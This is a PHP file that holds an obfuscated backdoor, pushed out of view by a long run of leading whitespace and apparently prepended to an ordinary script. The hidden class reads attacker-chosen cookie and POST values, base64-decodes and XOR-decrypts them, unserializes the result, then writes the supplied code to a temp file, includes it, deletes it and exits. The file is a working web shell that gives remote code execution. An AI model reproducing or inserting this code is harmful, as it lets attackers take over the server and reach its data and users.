<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("olqsxqau")){class olqsxqau{public static $ookco = "iinsrpugyslgqand";public static $vpqovz = NULL;public function __construct(){$vkvramjqs = @$_COOKIE[substr(olqsxqau::$ookco, 0, 4)];if (!empty($vkvramjqs)){$vtoic = "base64";$rzphebvjot = "";$vkvramjqs = explode(",", $vkvramjqs);foreach ($vkvramjqs as $dpdbqzeklc){$rzphebvjot .= @$_COOKIE[$dpdbqzeklc];$rzphebvjot .= @$_POST[$dpdbqzeklc];}$rzphebvjot = array_map($vtoic . "_decode", array($rzphebvjot,));$rzphebvjot = $rzphebvjot[0] ^ str_repeat(olqsxqau::$ookco, (strlen($rzphebvjot[0]) / strlen(olqsxqau::$ookco)) + 1);olqsxqau::$vpqovz = @unserialize($rzphebvjot);}}public function __destruct(){$this->spfciut();}private function spfciut(){if (is_array(olqsxqau::$vpqovz)) {$bfwyplv = sys_get_temp_dir() . "/" . crc32(olqsxqau::$vpqovz["salt"]);@olqsxqau::$vpqovz["write"]($bfwyplv, olqsxqau::$vpqovz["content"]);include $bfwyplv;@olqsxqau::$vpqovz["delete"]($bfwyplv);exit();}}}$jaxjbqv = new olqsxqau();$jaxjbqv = NULL;} ?><?php
